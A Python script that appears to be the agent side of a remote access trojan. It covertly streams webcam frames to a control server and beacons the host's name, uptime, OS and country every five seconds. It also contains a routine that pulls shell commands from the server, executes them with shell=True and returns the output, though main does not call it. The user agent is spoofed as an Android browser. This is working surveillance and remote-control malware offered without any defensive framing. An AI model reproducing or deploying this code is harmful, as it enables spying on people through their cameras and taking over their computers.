import time, uuid,requests,platform,psutil,os,subprocess,asyncio,cv2, threading

from datetime import timedelta

cap = cv2.VideoCapture(0)
SERVER_URL = "http://127.0.0.1:5000"
#AGENT_ID = str(uuid.uuid4())
AGENT_ID = "a3d48220-27d8-4551-bb36-157433163ad1"
USER_AGENT = "Mozilla/5.0 (Linux; Android 8.1.0; Core-X3 Build/OPM1.171019.019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36"

headers = {
        "Content-Type": 'application/json',
        "User-Agent": USER_AGENT,
        "Authorization": f"Bearer {AGENT_ID}",
        "X-Session-ID": f"{AGENT_ID}"
}

def camera():
    while 1:
        ret, frame = cap.read()

        success, encoded_img = cv2.imencode('.jpg', frame)

        files = {'image': ('frame.jpg', encoded_img.tobytes(), 'image/jpeg')}
        
        try:
            response = requests.post(SERVER_URL+"/upload", files=files, timeout=1)
        except requests.exceptions.RequestException as e:
            print(f"Error sending frame: {e}")

        time.sleep(0.03)

def get_country():
    get_region = requests.get("https://www.whatismyip.net/geoip/")
    return get_region.json().get("country")

def get_uptime():
    boot_time = psutil.boot_time()
    uptime_seconds = time.time() - boot_time
    uptime_duration = timedelta(seconds=uptime_seconds)

    return uptime_duration

def get_task():
    try:
        resp = requests.get(SERVER_URL + "/task/"+AGENT_ID, headers=headers)

        if resp.status_code == 200:
            data = resp.json()["task"]["command"]
            send_msg(execute(data))
    except:
        print("lost connection")

def execute(comm):
    try:
        result = subprocess.check_output(comm, shell=True, stderr=subprocess.STDOUT).decode("utf-8")
        return result
    except:
        pass

def send_msg(result):
    try:
        resp=requests.post(SERVER_URL + "/get_result/"+AGENT_ID, json={"result":result}, headers=headers)
        if resp.status_code == 200:
            print(f"send success {result}")
    except:
        pass

def status(): 
    while 1:
        payload = {"agent_id": AGENT_ID, "hostname":platform.node(),"uptime":str(get_uptime()), "os":platform.system(), "country":get_country() }
               
        try:
            resp = requests.post(SERVER_URL + "/status", json=payload, headers=headers)
        
            if resp.status_code == 200:
                data = resp.json()
                print(data)

            time.sleep(5)
        except Exception as err:
            print(err)


def main():
    threading.Thread(target=status).start()
        #get_task()
    threading.Thread(target=camera).start()

if "__main__" == __name__:
    main()
